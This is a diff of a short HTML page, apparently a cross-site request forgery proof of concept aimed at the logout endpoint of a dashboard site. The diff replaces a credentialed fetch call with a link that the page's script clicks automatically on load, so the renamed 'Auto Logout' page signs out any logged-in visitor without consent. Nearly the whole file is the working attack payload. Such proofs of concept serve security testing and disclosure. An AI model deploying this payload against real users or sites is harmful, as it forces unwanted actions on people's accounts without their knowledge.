@@ -2,14 +2,12 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8">
-    <title>CSRF Logout Test</title>
+    <title>Auto Logout</title>
   </head>
   <body>
+    <a id="logout" href="https://dashboard.wickbot.com/api/auth/logout">Click here to logout</a>
     <script>
-      fetch("https://dashboard.wickbot.com/api/auth/logout", {
-        method: "GET",
-        credentials: "include"
-      });
+      document.getElementById("logout").click();
     </script>
   </body>
 </html>
